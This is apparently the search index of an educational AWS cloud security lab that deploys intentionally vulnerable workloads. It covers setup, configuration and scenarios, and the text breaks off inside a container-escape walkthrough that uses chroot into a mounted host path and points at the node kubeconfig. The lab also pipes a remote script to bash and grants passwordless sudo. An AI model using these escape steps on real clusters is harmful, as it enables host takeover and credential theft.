{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Playground One","text":"<p>Ultra fast and slim playground in the clouds designed for educational and demoing purposes.</p>"},{"location":"#latest-news","title":"Latest News","text":"<p>!!! Playground prepares for Vision One !!!</p> <p>In a nutshell:</p> <ul> <li>Bootstrapping directly from the clouds. It will attempt to upgrade already installed tools to the latest available version.  </li> </ul> <pre><code>$ curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/pgo | bash &amp;&amp; exit\n</code></pre> <ul> <li>Management of the environment with the help of an easy to use command line interface <code>pgo</code>.</li> <li>Based on Terraform &gt;1.5</li> </ul>"},{"location":"#change-log","title":"Change Log","text":"<p>08/07/2023</p> <ul> <li>Initial release</li> </ul>"},{"location":"#currently-work-in-progress","title":"Currently Work in Progress","text":"<ul> <li>Fine-tuning and fixing bugs :-)</li> <li>Documentation of playbooks</li> </ul>"},{"location":"#requirements-and-support-matrix","title":"Requirements and Support Matrix","text":"<p>The Playground One is designed to work with AWS and is tested these operating systems</p> <ul> <li>Ubuntu Bionic and newer</li> <li>Cloud9 with Ubuntu</li> </ul>"},{"location":"#cli-commands-of-the-playground","title":"CLI Commands of the Playground","text":"<p>Besides the obvious cli tools like <code>kubectl</code>, etc. the Playground offers you additional commands shown in the table below (and more):</p> Command Function pgo The command line interface for Playground One stern Tail logs from multiple pods simultaneously syft See github.com/anchore/syft grype See github.com/anchore/grype k9s See k9scli.io"},{"location":"bloopers/","title":"Bloopers during development","text":"<ul> <li>Bloopers during development</li> <li>Terraform<ul> <li>Delete all resources except one</li> </ul> </li> <li>EKS<ul> <li>Unable to delete ingress</li> <li>Unable to delete namespace</li> <li>EKSWorkerNode is not joining Node Group</li> <li>EKS Service behind ALB shows only HTML</li> </ul> </li> <li>XDR for Containers</li> </ul>"},{"location":"bloopers/#terraform","title":"Terraform","text":""},{"location":"bloopers/#delete-all-resources-except-one","title":"Delete all resources except one","text":"<p>There is no --except feature in terraform destroy command currently. If you really want to do that, and you know what you are doing, here is the workaround.</p> <pre><code># list all resources\nterraform state list\n\n# remove that resource you don't want to destroy\n# you can add more to be excluded if required\nterraform state rm &lt;resource_to_be_deleted&gt; # destroy the whole stack except above excluded resource(s)\nterraform destroy </code></pre> <p>So why do these commands work for your idea?</p> <p>The state (*.tfstate) is used by Terraform to map real world resources to your configuration, keep track of metadata.</p> <p>terraform state rm cleans a record (resource) from the state file (*.tfstate) only. It doesn't destroy the real resource.</p> <p>Since you don't run terraform apply or terraform refresh, after terraform state rm, terraform doesn't know the excluded resource was created at all.</p> <p>When you run terraform destroy, it has no detail about that excluded resource\u2019s state and will not destroy it. It will destroy the rest.</p> <p>By the way, later you still have chance to import the resource back with terraform import command if you want.</p> <pre><code>terraform import module.vpc.aws_vpc.vpc vpc-0933149e01f1136aa\n</code></pre>"},{"location":"bloopers/#eks","title":"EKS","text":""},{"location":"bloopers/#unable-to-delete-ingress","title":"Unable to delete ingress","text":"<pre><code>kubectl delete ValidatingWebhookConfiguration aws-load-balancer-webhook\nkubectl patch ingress $Ingressname -n $namespace -p '{\"metadata\":{\"finalizers\":[]}}' --type=merge\n</code></pre>"},{"location":"bloopers/#unable-to-delete-namespace","title":"Unable to delete namespace","text":"<p>To delete a namespace, Kubernetes must first delete all the resources in the namespace. Then, it must check registered API services for the status. A namespace gets stuck in Terminating status for the following reasons:</p> <ul> <li>The namespace contains resources that Kubernetes can't delete.</li> <li> <p>An API service has a False status.</p> </li> <li> <p>Save a JSON file like in the following example:</p> </li> </ul> <pre><code>kubectl get namespace TERMINATING_NAMESPACE -o json &gt; tempfile.json\n</code></pre> <ol> <li>Remove the finalizers array block from the spec section of the JSON file:</li> </ol> <pre><code>\"spec\": {\n\"finalizers\": [\n\"kubernetes\"\n]\n}\n</code></pre> <p>After you remove the finalizers array block, the spec section of the JSON file looks like this:</p> <pre><code>\"spec\" : {\n}\n</code></pre> <ol> <li>To apply the changes, run the following command:</li> </ol> <pre><code>kubectl replace --raw \"/api/v1/namespaces/TERMINATING_NAMESPACE/finalize\" -f ./tempfile.json\n</code></pre> <ol> <li>Verify that the terminating namespace is removed:</li> </ol> <pre><code>kubectl get namespaces\n</code></pre> <p>Repeat these steps for any remaining namespaces that are stuck in the Terminating status.</p>"},{"location":"bloopers/#eksworkernode-is-not-joining-node-group","title":"EKSWorkerNode is not joining Node Group","text":"<p>This does help to identify the problem:</p> <ul> <li>https://repost.aws/knowledge-center/resolve-eks-node-failures</li> <li>https://docs.aws.amazon.com/systems-manager-automation-runbooks/latest/userguide/automation-awssupport-troubleshooteksworkernode.html</li> <li>https://console.aws.amazon.com/systems-manager/automation/execute/AWSSupport-TroubleshootEKSWorkerNode</li> </ul>"},{"location":"bloopers/#eks-service-behind-alb-shows-only-html","title":"EKS Service behind ALB shows only HTML","text":"<pre><code>resource \"kubernetes_ingress_v1\" \"openssl3_ingress\" {\nwait_for_load_balancer = true\nmetadata {\nannotations = {\n\"alb.ingress.kubernetes.io/scheme\"        = \"internet-facing\"\n\"alb.ingress.kubernetes.io/target-type\"   = \"ip\"\n\"kubernetes.io/ingress.class\"             = \"alb\"\n\"alb.ingress.kubernetes.io/inbound-cidrs\" = var.access_ip\n}\nlabels = {\napp = \"web-app\"\n}\nname      = \"web-app-ingress\"\nnamespace = var.namespace\n}\nspec {\nrule {\nhttp {\npath {\nbackend {\nservice {\nname = \"web-app-service\"\nport {\nnumber = 80\n}\n}\n}\npath = \"/*\"\n}\n}\n}\n}\n}\n</code></pre> <p>The <code>*</code> in <code>path</code> is important :-)</p>"},{"location":"bloopers/#xdr-for-containers","title":"XDR for Containers","text":"<p>Initially, I thought I just need to leave the VPC alone when changing/destroying part of the network configuration. This was a failure...</p>"},{"location":"getting-started/configuration/","title":"Getting Started Configuration","text":"<p>If you didn't create a new shell, then do so now.</p> <p>After bootstrapping you need to create a file called <code>config.yaml</code> to hold your specific configuration. Create this by running</p> <pre><code>$ cd ${ONEPATH}\n$ cp config.yaml.sample config.yaml\n</code></pre> <p>and open it with your prefered editor.</p> <p>The bare minimum to adapt are:</p> <ul> <li><code>aws.account_id</code></li> <li><code>cloudone_api_key</code></li> </ul> <p>If you change the <code>aws.environment</code>-name ensure that the value does NOT exceed 15 characters in length.</p> <p>Note: It is highly recommended to change the <code>awsone.access_ip</code> to a single IP or at least a small CIDR to prevent anonymous users playing with your environmnent. Remember: we're deploying vulnerable applications.</p> <p>If you need to change the <code>awsone.access_ip</code> later on, maybe because you got a new one assigned, follow these steps:</p> <ol> <li>change <code>awsone.access_ip</code> in the <code>config.yaml</code></li> <li>run <code>pgo --init all</code></li> <li>run <code>pgo --apply vpc</code></li> </ol> <p>If you have an EKS deployed run <code>pgo --apply eks</code> If you have an ECS deployed run <code>pgo --apply ecs</code></p> <p>For the rest and especially the default values see below:</p> <pre><code>services:\n- name: cloudone\n## Cloud One region to work with\n## \n## Default value: trend-us-1\nregion: ''\n## Cloud One instance to use\n##\n## Allowed values: cloudone, staging-cloudone, dev-cloudone\n## \n## Default value: cloudone\ninstance: ''\n## Cloud One API Key with Full Access\n## \n## REQUIRED if you want to play with Cloud One\n##\n## Default value: ''\napi_key: ''\n## Cloud One Scanner API Key\n## \n## REQUIRED if you want to play with Artifac Scanning as a Service\n##\n## Default value: ''\nscanner_api_key: ''\n- name: aws\n## The account id of your AWS account\n## \n## Default value: ''\naccount_id: ''\n## The default AWS region to use\n## \n## Default value: \"eu-central-1\"\nregion: ''\n## The default AWS environment name to use\n## \n## IMPORTANT: The value MUST NOT be longer than 15 characters\n##\n## Default value: \"playground-one\"\nenvironment: \"playground-one\"\n##        max ############### 15 characters\n- name: awsone\n## Restrict access to AWS One\n## \n## Default value: \"0.0.0.0/0\"\naccess_ip: ''\ninstances:\n## Create Linux instance(s)\n## \n## Default value: true\ncreate_linux: true\n## Create Windows instance(s)\n## \n## Default value: true\ncreate_windows: true\ncluster-eks:\n## Create Fargate Profile\n## \n## Default value: true\ncreate_fargate_profile : true\ncluster-ecs:\n## Create ECS Cluster with EC2\n## \n## Default value: true\ncreate_ec2: true\n## Create ECS Cluster with Fargate\n## \n## Default value: true\ncreate_fargate: true\n- name: container_security\n## The id of the policy for use with AWSONE\n## \n## Default value: ''\npolicy_id: ''\n- name: workload-security\n## Cloud One Workload Security Tenant ID\n## \n## REQUIRED if you want to play with Cloud One Workload Security\n##\n## Default value: ''\nws_tenant_id: ''\n## Cloud One Workload Security Token\n## \n## REQUIRED if you want to play with Cloud One Workload Security\n##\n## Default value: ''\nws_token: ''\n## Cloud One Workload Security Linux Policy ID\n## \n## REQUIRED if you want to play with Cloud One Workload Security\n##\n## Default value: 0\nws_policy_id: 0\n...\n</code></pre> <p>Now, continue with the chapter General Life-Cycle.</p>"},{"location":"getting-started/life-cycle/","title":"General Life-Cycle","text":"<p>The life-cycle of Playground One is controlled by the command line interface <code>pgo</code>.</p> <p>Use it to interact with the Playground One from anywhere in your terminal by running</p> <pre><code>$ pgo\n</code></pre> <p>from anywhere in your terminal.</p>"},{"location":"getting-started/life-cycle/#getting-help","title":"Getting Help","text":"<p>Run:</p> <pre><code>$ pgo --help\n</code></pre> <pre><code>Usage: pgo &lt;command&gt; &lt;configuration&gt; ...\n\nThe available commands for execution are listed below.\nThe primary workflow commands are given first, followed by\nless common or more advanced commands.\n\nMain commands:\n  -i --init     Prepare a configuration for other commands\n  -a --apply    Create of update infrastructure\n  -d --destroy  Destroy previously-created infrastructure\n  -o --output   Show output values\n  -s --state    Show the current state\n  -h --help     Show this help\nOther commands:\n  -S --show     Show advanced state\n  -v --validate Check whether the configuration is valid\n\nAvailable configurations:\n  vpc           VPC configuration\n  nw            Network configuration\n  ec2           EC2 configuration\n  eks           EKS configuration\n  ecs           ECS configurations\n  all           All configurations\n\nExamples:\n  pgo --apply vpc\n  pgo --state all\n</code></pre>"},{"location":"getting-started/life-cycle/#create-the-environment","title":"Create the Environment","text":"<ol> <li> <p>Initialize with</p> <pre><code>$ pgo --init all\n</code></pre> <p>This will prepare all available configurations. No changes done in the clouds yet. You only need to init once after cloning the repository.</p> </li> <li> <p>To create the VPC run</p> <pre><code>$ pgo --apply vpc\n</code></pre> <p>This will create your VPC in the configured region (see <code>config.yaml</code>)</p> </li> <li> <p>To create the Network run</p> <pre><code>$ pgo --apply nw\n</code></pre> <p>This will create your network in the configured vpc</p> </li> <li> <p>Create Virtual Instances and/or Kubernetes Clusters with demo workload</p> <p>EC2 instances:</p> <pre><code>$ pgo --apply ec2\n</code></pre> <p>EKS cluster:</p> <pre><code>$ pgo --apply eks\n</code></pre> <p>The default workload (Container Security, Trivy, and vulnerable apps) are deployed automatically.</p> <p>ECS cluster:</p> <pre><code>$ pgo --apply ecs\n</code></pre> <p>A default workload is deployed automatically.</p> </li> </ol>"},{"location":"getting-started/life-cycle/#query-outputs-and-state","title":"Query Outputs and State","text":"<p>The most relevant information on your configuration can be queried by running</p> <pre><code>$ pgo --output &lt;configuration&gt;\n</code></pre> <p>Example: <code>pgo --output ec2</code>:</p> <pre><code>public_instance_id_db1 = \"i-072abd953dedaae5d\"\npublic_instance_id_srv1 = \"i-0f2c91e08fd054510\"\npublic_instance_id_web1 = \"i-048ecedf660236f47\"\npublic_instance_ip_db1 = \"3.76.39.227\"\npublic_instance_ip_srv1 = \"3.75.219.198\"\npublic_instance_ip_web1 = \"18.197.106.33\"\npublic_instance_password_srv1 = &lt;sensitive&gt;\ns3_bucket = \"playground-awsone-cesh306v\"\nssh_instance_db1 = \"ssh -i ../playground-key-pair.pem -o StrictHostKeyChecking=no ubuntu@3.76.39.227\"\nssh_instance_srv1 = \"ssh -i ../playground-key-pair.pem -o StrictHostKeyChecking=no admin@3.75.219.198\"\nssh_instance_web1 = \"ssh -i ../playground-key-pair.pem -o StrictHostKeyChecking=no ubuntu@18.197.106.33\"\npublic_instance_password_srv1 = \"4h1v}Q7Hc9tbGWdM\"\n</code></pre> <p>With this you can always query how to connect to your running EC2 instances. All instances support SSH connections, the Windows Server Remote Desktop as well. For RDP Use the configured <code>admin</code> user, the ip address and password for srv1.</p>"},{"location":"getting-started/life-cycle/#tear-down","title":"Tear Down","text":"<p>If you want to destroy your environment completely or only parts of it</p> <pre><code>$ pgo --destroy &lt;configuration&gt;\n</code></pre> <p>If you want to tear down everything run</p> <pre><code>$ pgo --destroy all\n</code></pre> <p>Note: The network and VPC are not automatically destroyed. You can do this manually by running <code>pgo --destroy nw</code> and <code>pgo --destroy vpc</code>.</p>"},{"location":"getting-started/life-cycle/#optional-adapt-terraformtfvars-in-configurations","title":"Optional: Adapt <code>terraform.tfvars</code> in Configurations","text":"<p>The <code>terraform.tfvars</code>-files located within the configurations allow you to configure the AWS One playground in some aspects. Normally there's nothing to do for you, but if you only need Linux servers you could disable windows instance(s) in <code>3-instances/terraform.tfvars</code>.</p>"},{"location":"getting-started/prepare/","title":"Getting Started","text":"<p>Choose the platform documentation</p>"},{"location":"getting-started/prepare/#ubuntu","title":"Ubuntu","text":"<p>Follow this chapter if...</p> <ul> <li>you're using the Playground on a Ubuntu machine (not Cloud9)</li> </ul> <p>Test if <code>sudo</code> requires a password by running <code>sudo ls /etc</code>. If you don't get a password prompt you're fine, otherwise run.</p> <pre><code>$ sudo visudo -f /etc/sudoers.d/custom-users\n</code></pre> <p>Add the following line:</p> <pre><code>&lt;YOUR USER NAME&gt; ALL=(ALL) NOPASSWD:ALL </code></pre> <p>Now, run the Playground</p> <pre><code>$ curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/pgo | bash &amp;&amp; exit\n</code></pre> <p>The bootstrapping process will exit your current terminal or shell after it has done it's work. Depending on your environment just create a new terminal session and continue with Configuration.</p> <p>Note: Ensure that you are authenticated to AWS on your Ubuntu server. If not, run <code>aws configure</code> before proceeding.</p>"},{"location":"getting-started/prepare/#cloud9","title":"Cloud9","text":"<p>Follow this chapter if...</p> <ul> <li>you're using the Playground on a AWS Cloud9 environment</li> </ul> <p>Follow the steps below to create a Cloud9 suitable for the Playground.</p> <ul> <li>Point your browser to AWS</li> <li>Choose your default AWS region in the top right</li> <li>Go to the Cloud9 service</li> <li>Select <code>[Create Cloud9 environment]</code></li> <li>Name it as you like</li> <li>Choose <code>[t3.medium]</code> for instance type and</li> <li><code>Ubuntu 18.04 LTS</code> as the platform</li> <li>For the rest take all default values and click <code>[Create environment]</code></li> </ul> <p>Update IAM Settings for the Workspace</p> <ul> <li>Click the gear icon (in top right corner), or click to open a new tab and choose <code>[Open Preferences]</code></li> <li>Select AWS SETTINGS</li> <li>Turn OFF <code>[AWS managed temporary credentials]</code></li> <li>Close the Preferences tab</li> </ul> <p>Now, run the Playground</p> <pre><code>$ curl -fsSL https://raw.githubusercontent.com/mawinkler/playground-one/main/bin/pgo | bash &amp;&amp; exit\n</code></pre> <p>If you run the above command on a newly created or rebooted Cloud9 instance and are receiving the following error, just wait a minute or two and rerun the curl command. The reason for this error is, that directly after starting the machine some update processes are running in the background causing the lock to the package manager process.</p> <pre><code>E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)\nE: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?\n</code></pre> <p>You will be asked for your AWS credentials. They will never be stored on disk and get removed from memory after creating and assigning an instance role to the Cloud9 instance.</p> <p>If you forgot to disable AWS managed temporary credentials you will asked to do it again.</p> <p>The bootstrapping process will exit your current terminal or shell after it has done it's work. Depending on your environment just create a new terminal session and continue with Configuration.</p>"},{"location":"how-it-works/configurations/","title":"Playground One Configurations","text":"<p>The Playground One has a modular structure as shown in the following tree:</p> <pre><code>awsone\n\u251c\u2500\u2500 vpc (1-vpc)\n\u251c   \u2514\u2500\u2500 network (2-network)\n\u2502    \u00a0\u00a0 \u251c\u2500\u2500 ec2 (3-instances)\n\u2502    \u00a0\u00a0 \u251c\u2500\u2500 eks (4-cluster-eks)\n\u2502    \u00a0\u00a0 |   \u2514\u2500\u2500 eks-deployments (8-cluster-eks-deployments)\n\u2502       \u2514\u2500\u2500 ecs (5-cluster-ecs)\n</code></pre> <p>As we can see, the configuration <code>vpc</code> is the base for the other configurations. The configuration <code>network</code> creates the Subnets, Route Tables, Security Groups, etc. One can choose to only create the EKS cluster, or ECS cluster, or even the full stack. Everything will reside in the same VPC.</p> <p>Architecture:</p> <p></p> <p>Security Groups: TODO: UPDATE</p> <p></p> <p>The following chapters describe the different configurations on a high level, refer the the dedicated documentation for more details.</p>"},{"location":"how-it-works/configurations/#virtual-private-cloud","title":"Virtual Private Cloud","text":"<p>Configuration located in <code>awsone/1-vpc</code></p> <p>This, very simple configuration just creates a VPC with actually no content. Solely DNS and the VPC CIDR is defined.</p>"},{"location":"how-it-works/configurations/#network","title":"Network","text":"<p>Configuration located in <code>awsone/2-network</code></p> <p>This configuration defines a network with the most commonly used architecture, private and public subnets accross three availability zones. It includes everything what a VPC should have, this is amongst others an internet gateway, NAT gateway, security groups, etc. Since a VPC is cheap there's no real need to destroy the networking configuration everyday, just leave it as it is and reuse it the next time. This eases the handling of other components like Vision One XDR for Containers.</p>"},{"location":"how-it-works/configurations/#virtual-instances","title":"Virtual Instances","text":"<p>Configuration located in <code>awsone/3-instances</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>Basically, a couple of EC2 instances are created with this configuration. Currently these are two linux and one windows instances.</p> <p>If you store the agent installers for Server and Workload Security in <code>0-files</code> the instances will connect to Vision One.</p> <p>You can optionally drop any file or installer in the <code>0-files</code> directory which will then be available in the ec2 instances download folder.</p>"},{"location":"how-it-works/configurations/#eks-cluster","title":"EKS Cluster","text":"<p>Configuration located in <code>awsone/4-cluster-eks</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>So, this is my favorite part. This configuration creates an EKS cluster with some nice key features:</p> <ul> <li>Autoscaling from 1 to 10 nodes</li> <li>Nodes running as Spot instances to save money :-)</li> <li>ALB Load Balancer controller</li> <li>Kubernetes Autoscaler</li> <li>Optional Fargate profile</li> <li>Cluster is located in the private subnets</li> </ul>"},{"location":"how-it-works/configurations/#cluster-deployments","title":"Cluster Deployments","text":"<p>Configuration located in <code>awsone/8-cluster-deployments</code></p> <p>Depends on <code>awsone/4-cluster-eks</code></p> <p>Currently, the following deployments are defined:</p> <ul> <li>Container Security</li> <li>Trivy</li> <li>Vulnerable Java-Goof</li> <li>Vulnerable Web App (openssl)</li> </ul>"},{"location":"how-it-works/configurations/#ecs-clusters","title":"ECS Clusters","text":"<p>Configuration located in <code>awsone/5-cluster-ecs</code></p> <p>Depends on <code>awsone/2-network</code></p> <p>Here we're building an ECS cluster using EC2 instances and/or Fargate profile. Key features:</p> <ul> <li>Two autoscaling groups (on-demand and spot) when using the EC2 variant</li> <li>Fargate profile with a mix of on-demand and spot instances</li> <li>ALB Load Balancer</li> <li>Located in the private subnets</li> <li>Automatic deployment of a vulnerable service (Java-Goof)</li> </ul>"},{"location":"how-it-works/orchestration/","title":"Orchestration","text":""},{"location":"how-it-works/orchestration/#how-it-works","title":"How it works","text":"<p>The Playground One utilizes Terraform to maintain the environment. For best flexibility and cost optimization it is structured into several Terraform configurations. You can also view these configurations as modules that can be linked together as needed.</p> <p>Note: Currently, the only cloud supported is AWS, when required other public cloud providers might follow.</p>"},{"location":"how-it-works/orchestration/#what-is-terraform","title":"What is Terraform?","text":"<p>Terraform is an infrastructure as code tool that lets you build, change, and version cloud and on-prem resources safely and efficiently. It is maintained by HashiCorp.</p> <p>HashiCorp Terraform is an infrastructure as code tool that lets you define both cloud and on-prem resources in human-readable configuration files that you can version, reuse, and share. You can then use a consistent workflow to provision and manage all of your infrastructure throughout its lifecycle. Terraform can manage low-level components like compute, storage, and networking resources, as well as high-level components like DNS entries and SaaS features.</p>"},{"location":"how-it-works/orchestration/#how-does-terraform-work","title":"How does Terraform work?","text":"<p>Terraform creates and manages resources on cloud platforms and other services through their application programming interfaces (APIs). Providers enable Terraform to work with virtually any platform or service with an accessible API.</p> <p></p> <p>HashiCorp and the Terraform community have already written thousands of providers to manage many different types of resources and services. You can find all publicly available providers on the Terraform Registry, including Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, and many more.</p> <p></p> <p>The core Terraform workflow consists of three stages:</p> <p>Write: You define resources, which may be across multiple cloud providers and services. For example, you might create a configuration to deploy an application on virtual machines in a Virtual Private Cloud (VPC) network with security groups and a load balancer.</p> <p>Plan: Terraform creates an execution plan describing the infrastructure it will create, update, or destroy based on the existing infrastructure and your configuration.</p> <p>Apply: On approval, Terraform performs the proposed operations in the correct order, respecting any resource dependencies. For example, if you update the properties of a VPC and change the number of virtual machines in that VPC, Terraform will recreate the VPC before scaling the virtual machines.</p>"},{"location":"integrations/container-security/","title":"Vision One Container Security","text":"<p>Note: At the time of writing, Container Security is integrated in Playground One by the helm chart on EKS only. The UI is still on Cloud One.</p>"},{"location":"integrations/container-security/#setup-of-container-security-with-the-playground-one","title":"Setup of Container Security with the Playground One","text":"<p>Container Security is automatically deployed to the EKS cluster of Playground One. If you provided a proper Cloud One information it is already up and running.</p> <p>Required information in <code>config.yaml</code>:</p> <ul> <li>Trend Cloud One API Key</li> <li>Trend Cloud One Region</li> <li>Container Security Policy ID</li> </ul> <p>To get the Policy ID head over to Container Security on Cloud One and navigate to the policy. The Policy ID is the part after the last <code>/</code> in the URL:</p> <pre><code>https://cloudone.trendmicro.com/container/policies/relaxed_playground-2OxPQEiC6Jo4dbDVfebKiZMured\n</code></pre> <p>Here: <code>relaxed_playground-2OxPQEiC6Jo4dbDVfebKiZMured</code></p> <p>Create the EKS cluster including Container Security by running</p> <pre><code>$ pgo --apply eks\n</code></pre>"},{"location":"integrations/container-security/#scenarios","title":"Scenarios","text":"<ul> <li>Escape to Node</li> <li>Gain a Privileged Shell</li> <li>Generate Runtime Violations</li> <li>Find Runtime Vulnerabilities</li> </ul>"},{"location":"integrations/endpoint-security/","title":"Vision One Endpoint Security Server &amp; Workload Protection","text":"<p>Three different instances are currently provided by the AWS One Playground with different configurations:</p> <p>Instance Web1:</p> <ul> <li>Ubuntu Linux 20.04</li> <li>Nginx and Wordpress deployment</li> <li>Vision One Endpoint Security Basecamp agent for Server &amp; Workload Protection</li> </ul> <p>Instance Db1:</p> <ul> <li>Ubuntu Linux 20.04</li> <li>MySql databse</li> <li>Vision One Endpoint Security Basecamp agent for Server &amp; Workload Protection</li> </ul> <p>Instance Srv1:</p> <ul> <li>Windows Server 2022 Standalone Server</li> <li>Vision One Endpoint Security Basecamp agent for Server &amp; Workload Protection</li> </ul> <p>All instances can be integrated with Vision One Endpoint Security for Server &amp; Workload Protection and have access to the Atomic Launcher (if provided).</p> <p>The instances are created within a public subnet of Playground One's VPC. They all get an EC2 instance role assigned providing them the ability to access installer packages stored within an S3 bucket.</p> <p>All instances including the Windows Server are accessible via ssh and key authentication. RDP for Windows is supported in addition to this.</p>"},{"location":"integrations/endpoint-security/#optional-drop-vision-one-installer-packages","title":"Optional: Drop Vision One Installer Packages","text":"<p>If you want the instances automatically to be activated against your Server and Workload Protection Manager instance you need to download the installer packages for Vision One Endpoint Security for Windows and/or Linux from your Vision One instance. You need to do this manually since these installers are specific to your environment.</p> <p>The downloaded files are named something similar like</p> <p><code>TMServerAgent_Windows_auto_64_Server_and_Workload_Protection_Manager_-_CLOUDONE-ID.zip</code></p> <p>and/or</p> <p><code>TMServerAgent_Linux_auto_64_Server_and_Workload_Protection_Manager_-CLOUDONE-ID.tar</code>.</p> <p>Rename them to <code>TMServerAgent_Linux.tar</code> and <code>TMServerAgent_Windows.zip</code> respectively and copy the file(s) to <code>${ONEPATH}/awsone/0-files</code>.</p>"},{"location":"integrations/endpoint-security/#optional-server-workload-protection-event-based-tasks","title":"Optional: Server &amp; Workload Protection Event-Based Tasks","text":"<p>Create Event-Based Tasks to automatically assign Linux or Windows server policies to the machines.</p> <p>Agent-initiated Activation Linux</p> <ul> <li>Actions: Assign Policy: Linux Server</li> <li>Conditions: \"Platform\" matches \".*Linux*.\"</li> </ul> <p>Agent-initiated Activation Windows</p> <ul> <li>Actions: Assign Policy: Windows Server</li> <li>Conditions: \"Platform\" matches \".*Windows*.\"</li> </ul>"},{"location":"integrations/endpoint-security/#optional-drop-atomic-launcher-packages","title":"Optional: Drop Atomic Launcher Packages","text":"<p>If you want to experiment with Atomic Launcher download the packages from here and store them in the  <code>${ONEPATH}/awsone/0-files</code> directory as well.</p> <p>Your <code>${ONEPATH}/awsone/0-files</code>-directory should look like this:</p> <pre><code>-rw-rw-r-- 1 user user 17912014 Aug  1 14:50 atomic_launcher_linux_1.0.0.1009.zip\n-rw-rw-r-- 1 user user 96135367 Aug  1 14:50 atomic_launcher_windows_1.0.0.1013.zip\n-rw-rw-r-- 1 user user        0 Jul 28 06:22 see_documentation\n-rw-rw-r-- 1 user user      144 Aug  1 14:33 TMServerAgent_Linux_deploy.sh\n-rw-rw-r-- 1 user user 27380224 Aug  1 14:50 TMServerAgent_Linux.tar\n-rw-rw-r-- 1 user user     1145 Aug  1 14:33 TMServerAgent_Windows_deploy.ps1\n-rw-rw-r-- 1 user user  3303522 Aug  1 14:50 TMServerAgent_Windows.zip\n</code></pre> <p>The Atomic Launcher is stored within the downloads folder of each of the instances.</p> <p>The unzip password is <code>virus</code>.</p> <p>You should disable Anti Malware protection und set the IPS module to detect only before using Atomic Launcher :-).</p>"},{"location":"integrations/xdr-for-containers/","title":"Vision One XDR for Containers","text":"<p>Note: At the time of writing, XDR for Containers is in an early preview stage and only one to be protected VPC is supported. The cluster variants provided by Playground One support Application Load Balancing which is required for XDR for Containers.</p> <p>You need to create a connection with XDR for Containers by going through the workflow in your Vision One environment.</p>"},{"location":"integrations/xdr-for-containers/#connect-xdr-for-containers-with-the-playground-one","title":"Connect XDR for Containers with the Playground One","text":"<p>Before connecting XDR for Containers you need to have the VPC of Playground One created already.</p> <pre><code>$ pgo --apply vpc\n</code></pre> <p>Note: You don't need to destroy the VPC each time because this would mean to disconnect Vision One from it and reestablish the connection the next time. This takes about 20 minutes overall. So leave the VPC as it is.</p> <p>Required information:</p> <ul> <li>Trend Cloud One API Key</li> <li>Trend Cloud One Region</li> <li>AWS Account ID</li> <li>AWS VPC ID</li> <li>VPC Region</li> </ul> <p>Follow the deployment instructions from Vision One. You can query your <code>AWS VPC ID</code> by running <code>pgo --output vpc</code>.</p> <p>Make sure to deploy the stack in the region of the VPC when pressing <code>[Launch Stack]</code>.</p> <p></p> <p>All provided clusters from Playground One can be used with XDR for Containers.</p>"},{"location":"integrations/xdr-for-containers/#scenarios","title":"Scenarios","text":"<ul> <li>Tomcat Remote Code Execution</li> <li>JNDI Injection in HTTP Request</li> <li>Apache Struts Multipart Encoding Command Injection</li> </ul>"},{"location":"scenarios/container-security-eks-escape/","title":"Scenario: Escape to the Host System","text":""},{"location":"scenarios/container-security-eks-escape/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security</li> <li>Playground One EKS Cluster</li> <li>Running app: System Monitor</li> </ul>"},{"location":"scenarios/container-security-eks-escape/#attribution","title":"Attribution","text":"<p>This scenario is based on Kubernetes Goat but adapted to work an Playground One and EKS.</p>"},{"location":"scenarios/container-security-eks-escape/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/container-security-eks-escape/#overview","title":"Overview","text":"<p>This scenario showcases the common misconfigurations and one of the error-prone security issues in Kubernetes, container environments, and the general security world. Giving privileges that are not required for things always makes security worse. This is especially true in the containers and Kubernetes world. You can also apply this scenario further and beyond the container to other systems and services based on the configuration and setup of the cluster environments and resources. In this scenario you will see a privileged container escape to gain access to the host system.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Able to exploit the container and escape out of the docker container</li> <li>You will learn to test and exploit the misconfigured and privileged containers</li> <li>Learn about common misconfigurations and possible damage due to them for the containers, Kubernetes, and clusterized environments</li> </ul>"},{"location":"scenarios/container-security-eks-escape/#the-story","title":"The story","text":"<p>Most of the monitoring, tracing, and debugging software requires extra privileges and capabilities to run. In this scenario, you will see a pod with extra capabilities and privileges including HostPath allowing you to gain access to the host system and provide Node level configuration to gain complete cluster compromise.</p> <p>Note: To get started with the scenario, navigate to <code>http://&lt;loadbalancer_dns_system_monitor&gt;</code></p>"},{"location":"scenarios/container-security-eks-escape/#goals","title":"Goals","text":"<p>The goal of this scenario is to escape out of the running docker container on the host system using the available misconfigurations. The secondary goal is to use the host system-level access to gain other resources access and if possible even go beyond this container, node, and cluster-level access.</p> <p>Tip: Gain access to the host system and obtain the node level kubeconfig file <code>/var/lib/kubelet/kubeconfig</code>, and query the Kubernetes nodes using the obtained configuration.</p>"},{"location":"scenarios/container-security-eks-escape/#hints","title":"Hints","text":"Click here  *\u2728 Are you still in the container?*  See the mounted file systems, also look the capabilities available for the container using capsh \ud83d\ude4c  *\u2728 Escaped container?*  You can recon the system, some interesting places to obtain the node level configuration are `/var/lib/kubelet/kubeconfig` and I hope you know how to query Kubernetes API for nodes? \ud83c\udf89"},{"location":"scenarios/container-security-eks-escape/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted.  <pre><code>$ capsh --print\n</code></pre> <pre><code>$ mount\n</code></pre>  Now you can explore the mounted file system by navigating to the /host-system path  <pre><code>$ ls /host-system/\n</code></pre>  You can gain access to the host system privileges using chroot  <pre><code>$ chroot /host-system bash\n</code></pre>  As you can see, now you can access all the 